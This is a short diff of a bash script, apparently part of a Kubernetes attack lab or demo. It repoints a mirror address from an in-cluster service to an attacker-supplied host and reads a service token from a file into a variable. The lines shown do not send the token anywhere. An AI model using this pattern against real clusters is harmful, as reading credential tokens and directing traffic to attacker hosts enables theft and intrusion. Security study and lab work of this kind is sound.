@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-MIRRORADDR="${MIRRORADDR:-prova.dmz.svc.cluster.local:8080}"
+MIRRORADDR="$ATTACKERADDR:8080"
 ATTACKED_NS="${ATTACKED_NS:-"dmz"}"
 TOKEN_PATH="$DATA_PATH/KC1/token"
 TOKEN=$(cat ${TOKEN_PATH})
